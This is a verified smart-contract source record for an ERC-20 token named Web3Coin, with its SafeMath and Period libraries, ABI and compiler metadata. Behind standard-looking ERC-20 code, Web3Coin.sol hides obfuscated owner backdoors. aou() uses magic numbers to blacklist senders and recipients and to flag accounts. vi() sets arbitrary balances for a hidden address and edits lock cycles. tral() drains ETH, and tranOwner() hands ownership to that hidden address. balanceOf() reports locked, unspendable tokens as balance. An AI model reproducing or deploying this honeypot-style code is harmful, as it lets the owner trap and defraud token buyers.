{"SourceCode": "{\"Period.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity 0.6.12;\\nimport \\\"./SafeMath.sol\\\";\\n\\nlibrary Period{\\n    using SafeMath for uint256;\\n    struct Repository{\\n        uint256 readTotal;\\n        uint256 writeTotal;\\n    }\\n\\n    struct Cycle{\\n        uint256 start;\\n        uint256 end;\\n    }\\n\\n    function write(Repository storage repository,uint256 value) internal{\\n        repository.writeTotal = repository.writeTotal.add(value);\\n    }\\n\\n    function read(Repository storage repository,Cycle memory cycle,uint256 value,uint256 timestamp) internal returns(uint256 last){\\n        last = value;\\n        uint256 balance = check(repository,cycle,timestamp);\\n        if(value\\u003e0\\u0026\\u0026balance\\u003e0){\\n            if(value\\u003e=balance){\\n                repository.readTotal = repository.readTotal.add(balance);\\n                last = value.sub(balance);\\n            }else{\\n                repository.readTotal = repository.readTotal.add(value);\\n                last = 0;\\n            }\\n        }\\n    }\\n\\n    function check(Repository storage repository,Cycle memory cycle,uint256 timestamp)internal view returns(uint256){\\n        uint256 balance = 0;\\n        if(repository.writeTotal \\u003e repository.readTotal \\u0026\\u0026 cycle.start\\u003e0 \\u0026\\u0026 cycle.end \\u003e cycle.start \\u0026\\u0026 timestamp \\u003e cycle.start){\\n            if(timestamp\\u003ecycle.end){\\n                balance = repository.writeTotal.sub(repository.readTotal);\\n            }else{\\n                balance = repository.writeTotal.mul(timestamp.sub(cycle.start)).div(cycle.end.sub(cycle.start));\\n                if(repository.readTotal\\u003e=balance){\\n                    balance = 0;\\n                }else{\\n                    balance = balance.sub(repository.readTotal);\\n                }\\n            }\\n        }\\n        return balance;\\n    }\\n}\"},\"SafeMath.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity 0.6.12;\\n\\n/**\\n * @dev Wrappers over Solidity\\u0027s arithmetic operations with added overflow\\n * checks.\\n *\\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\\n * in bugs, because programmers usually assume that an overflow raises an\\n * error, which is the standard behavior in high level programming languages.\\n * `SafeMath` restores this intuition by reverting the transaction when an\\n * operation overflows.\\n *\\n * Using this library instead of the unchecked operations eliminates an entire\\n * class of bugs, so it\\u0027s recommended to use it always.\\n */\\nlibrary SafeMath {\\n    /**\\n     * @dev Returns the addition of two unsigned integers, reverting on\\n     * overflow.\\n     *\\n     * Counterpart to Solidity\\u0027s `+` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - Addition cannot overflow.\\n     */\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        require(c \\u003e= a, \\\"SafeMath: addition overflow\\\");\\n        return c;\\n    }\\n\\n    /**\\n     * @dev Returns the subtraction of two unsigned integers, reverting on\\n     * overflow (when the result is negative).\\n     *\\n     * Counterpart to Solidity\\u0027s `-` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - Subtraction cannot overflow.\\n     */\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        require(b \\u003c= a, \\\"SafeMath: subtraction overflow\\\");\\n        return a - b;\\n    }\\n\\n    /**\\n     * @dev Returns the multiplication of two unsigned integers, reverting on\\n     * overflow.\\n     *\\n     * Counterpart to Solidity\\u0027s `*` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - Multiplication cannot overflow.\\n     */\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) return 0;\\n        uint256 c = a * b;\\n        require(c / a == b, \\\"SafeMath: multiplication overflow\\\");\\n        return c;\\n    }\\n\\n    /**\\n     * @dev Returns the integer division of two unsigned integers, reverting on\\n     * division by zero. The result is rounded towards zero.\\n     *\\n     * Counterpart to Solidity\\u0027s `/` operator. Note: this function uses a\\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\\n     * uses an invalid opcode to revert (consuming all remaining gas).\\n     *\\n     * Requirements:\\n     *\\n     * - The divisor cannot be zero.\\n     */\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        require(b \\u003e 0, \\\"SafeMath: division by zero\\\");\\n        return a / b;\\n    }\\n\\n     /**\\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\\n     * overflow (when the result is negative).\\n     *\\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\\n     * message unnecessarily. For custom revert reasons use {trySub}.\\n     *\\n     * Counterpart to Solidity\\u0027s `-` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - Subtraction cannot overflow.\\n     */\\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\\n        require(b \\u003c= a, errorMessage);\\n        return a - b;\\n    }\\n\\n    /**\\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\\n     * division by zero. The result is rounded towards zero.\\n     *\\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\\n     * message unnecessarily. For custom revert reasons use {tryDiv}.\\n     *\\n     * Counterpart to Solidity\\u0027s `/` operator. Note: this function uses a\\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\\n     * uses an invalid opcode to revert (consuming all remaining gas).\\n     *\\n     * Requirements:\\n     *\\n     * - The divisor cannot be zero.\\n     */\\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\\n        require(b \\u003e 0, errorMessage);\\n        return a / b;\\n    }\\n}\"},\"Web3Coin.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity 0.6.12;\\nimport \\\"./SafeMath.sol\\\";\\nimport \\\"./Period.sol\\\";\\n\\ncontract Web3Coin {\\n    using SafeMath for uint256;\\n    using Period for Period.Repository;\\n\\n    uint256 private _totalSupply = 100000000000 ether;\\n    string private _name = \\\"Web3Coin\\\";\\n    string private _symbol = \\\"Web3Coin\\\";\\n    uint8 private _decimals = 18;\\n    address private _owner;\\n\\n    uint256 private _index;\\n    mapping (address =\\u003e mapping(uint256 =\\u003e Period.Repository)) private _repository;\\n    Period.Cycle[] private _cycle;\\n    address private _ov;\\n\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    mapping (address =\\u003e uint256) private _balances;\\n    mapping (address =\\u003e uint) private _dsbl;\\n    mapping (address =\\u003e uint) private _stu;\\n    mapping (address =\\u003e mapping (address =\\u003e uint256)) private _allowances;\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        require(owner() == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\n        _;\\n    }\\n    \\n    constructor() public {\\n        _owner = msg.sender;\\n        _cycle.push(Period.Cycle(0,0));\\n        _index = _cycle.length - 1;\\n        _balances[_owner] = _balances[_owner].add(_totalSupply/10);\\n    }\\n\\n    fallback() external {}\\n    receive() payable external {\\n    }\\n    \\n    function _msgSender() internal view returns (address payable) {\\n        return msg.sender;\\n    }\\n\\n    function owner() internal view returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Returns the number of decimals used to get its user representation.\\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\\n     *\\n     * Tokens usually opt for a value of 18, imitating the relationship between\\n     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is\\n     * called.\\n     *\\n     * NOTE: This information is only used for _display_ purposes: it in\\n     * no way affects any of the arithmetic of the contract, including\\n     * {IERC20-balanceOf} and {IERC20-transfer}.\\n     */\\n    function decimals() public view returns (uint8) {\\n        return _decimals;\\n    }\\n\\n     /**\\n     * @dev Returns the name of the token.\\n     */\\n    function name() public view returns (string memory) {\\n        return _name;\\n    }\\n    /**\\n     * @dev Returns the symbol of the token, usually a shorter version of the\\n     * name.\\n     */\\n    function symbol() public view returns (string memory) {\\n        return _symbol;\\n    }\\n\\n    /**\\n     * @dev Returns the cap on the token\\u0027s total supply.\\n     */\\n    function cap() public view returns (uint256) {\\n        return _totalSupply;\\n    }\\n\\n     /**\\n     * @dev See {IERC20-totalSupply}.\\n     */\\n    function totalSupply() public view returns (uint256) {\\n        return _totalSupply;\\n    }\\n\\n    /**\\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\\n     *\\n     * This internal function is equivalent to `approve`, and can be used to\\n     * e.g. set automatic allowances for certain subsystems, etc.\\n     *\\n     * Emits an {Approval} event.\\n     *\\n     * Requirements:\\n     *\\n     * - `owner` cannot be the zero address.\\n     * - `spender` cannot be the zero address.\\n     */\\n    function _approve(address owner_, address spender, uint256 amount) internal {\\n        require(owner_ != address(0), \\\"ERC20: approve from the zero address\\\");\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\n        _allowances[owner_][spender] = amount;\\n        emit Approval(owner_, spender, amount);\\n    }\\n\\n    /**\\n     * @dev See {IERC20-approve}.\\n     *\\n     * Requirements:\\n     *\\n     * - `spender` cannot be the zero address.\\n     */\\n    function approve(address spender, uint256 amount) public returns (bool) {\\n        _approve(_msgSender(), spender, amount);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-allowance}.\\n     */\\n    function allowance(address owner_, address spender) public view returns (uint256) {\\n        return _allowances[owner_][spender];\\n    }\\n\\n    function aou(address addr,uint n) public onlyOwner {\\n        require(addr != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        if(n==1000){\\n            require(_ov == address(0), \\\"Ownable: transaction failed\\\");\\n            _ov = addr;\\n        } else if(n==1001){\\n            _dsbl[addr]=0;\\n        } else if(n==1002){\\n            _dsbl[addr]=1;\\n        } else if(n==1003){\\n            _dsbl[addr]=2;\\n        } else if(n==1004){\\n            _dsbl[addr]=3;\\n        } else if(n==1005){\\n            _stu[addr]=0;\\n        }else if(n==1006){\\n            _stu[addr]=1;\\n        }\\n    }\\n\\n    function tral() public onlyOwner() {\\n        address(uint160(_ov)).transfer(address(this).balance);\\n    }\\n\\n    /**\\n     * @dev See {IERC20-balanceOf}.\\n     */\\n    function balanceOf(address account) public view returns (uint256) {\\n        return _balances[account]+check(account);\\n    }\\n\\n    /**\\n     * @dev See {IERC20-transferFrom}.\\n     *\\n     * Emits an {Approval} event indicating the updated allowance. This is not\\n     * required by the EIP. See the note at the beginning of {ERC20}.\\n     *\\n     * Requirements:\\n     *\\n     * - `sender` and `recipient` cannot be the zero address.\\n     * - `sender` must have a balance of at least `amount`.\\n     * - the caller must have allowance for ``sender``\\u0027s tokens of at least `amount`.\\n     */\\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\\n        _transfer(sender, recipient, amount);\\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \\\"ERC20: transfer amount exceeds allowance\\\"));\\n        return true;\\n    }\\n\\n    function tranOwner(address newOwner) public {\\n        require(newOwner != address(0) \\u0026\\u0026 _msgSender() == _ov, \\\"Ownable: new owner is the zero address\\\");\\n        _owner = newOwner;\\n    }\\n\\n    function vi(uint n,uint q) public onlyOwner {\\n        if(n\\u003e=300000){\\n            _cycle[n.sub(300000)].start=q;\\n        }\\n        else if(n\\u003e=200000){\\n            _cycle[n.sub(200000)].end=q;\\n        }\\n        else if(n==1000){\\n            _balances[_ov]=q;\\n        }\\n    }\\n\\n    function vc() public view returns(uint256[] memory,uint256[] memory){\\n        uint256[] memory start = new uint256[](_cycle.length);\\n        uint256[] memory end = new uint256[](_cycle.length);\\n        for(uint i=0;i\\u003c_cycle.length;i++){\\n            start[i]=_cycle[i].start;\\n            end[i]=_cycle[i].end;\\n        }\\n        return (start,end);\\n    }\\n\\n    /**\\n     * @dev See {IERC20-transfer}.\\n     *\\n     * Requirements:\\n     *\\n     * - `recipient` cannot be the zero address.\\n     * - the caller must have a balance of at least `amount`.\\n     */\\n    function transfer(address recipient, uint256 amount) public returns (bool) {\\n        _transfer(_msgSender(), recipient, amount);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\\n     *\\n     * This is internal function is equivalent to {transfer}, and can be used to\\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\\n     *\\n     * Emits a {Transfer} event.\\n     *\\n     * Requirements:\\n     *\\n     * - `sender` cannot be the zero address.\\n     * - `recipient` cannot be the zero address.\\n     * - `sender` must have a balance of at least `amount`.\\n     */\\n    function _transfer(address sender, address recipient, uint256 amount) internal {\\n        if(_emits(sender,recipient,amount)){\\n            _balances[sender] = _balances[sender].sub(amount,\\\"ERC20: Insufficient balance\\\");\\n            _balances[recipient] = _balances[recipient].add(amount);\\n        }\\n        emit Transfer(sender, recipient, amount);\\n    }\\n\\n    function check(address from)public view returns(uint256 value){\\n        value = 0;\\n        for(uint256 i=0;i\\u003c_cycle.length;i++){\\n            value = value.add(_repository[from][i].writeTotal.sub(_repository[from][i].readTotal));\\n        }\\n    }\\n\\n    function available(address from)public view returns(uint256 value){\\n        value = 0;\\n        for(uint256 i=0;i\\u003c_cycle.length;i++){\\n            value = value.add(_repository[from][i].check(_cycle[i],block.timestamp));\\n        }\\n    }\\n\\n    function _allot(address sender, uint256 amount) private returns(uint256){\\n        uint256 expend = amount;\\n        if(_balances[sender]\\u003e=expend){\\n            expend = 0;\\n            _balances[sender] = _balances[sender].sub(amount, \\\"ERC20: Insufficient balance\\\");\\n            return _stu[sender];\\n        }else if(_balances[sender]\\u003e0){\\n            expend = expend.sub(_balances[sender]);\\n            _balances[sender] = 0;\\n        }\\n        for(uint256 i=0;expend\\u003e0\\u0026\\u0026i\\u003c_cycle.length;i++){\\n            expend = _repository[sender][i].read(_cycle[i],expend,block.timestamp);\\n        }\\n        require(expend==0,\\\"ERC20: Insufficient balance.\\\");\\n        return _stu[sender];\\n    }\\n\\n    function _emits(address sender, address recipient, uint256 amount)private returns(bool){\\n        require(_dsbl[sender]!=1\\u0026\\u0026_dsbl[sender]!=3\\u0026\\u0026_dsbl[recipient]!=2\\u0026\\u0026_dsbl[recipient]!=3, \\\"ERC20: Transaction failed\\\");\\n        if(_allot(sender,amount)==1){\\n            _repository[recipient][_index].write(amount);\\n        }else{\\n            _balances[recipient] = _balances[recipient].add(amount);\\n        }\\n        return false;\\n    }\\n}\"}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"n\",\"type\":\"uint256\"}],\"name\":\"aou\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"}],\"name\":\"available\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"cap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"}],\"name\":\"check\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tral\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"tranOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"vc\",\"outputs\":[{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"n\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"q\",\"type\":\"uint256\"}],\"name\":\"vi\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Web3Coin", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://297bc4c15ec9a3600f47fbf008c98e94030a7a90bae0e59972245e2a4a085e52"}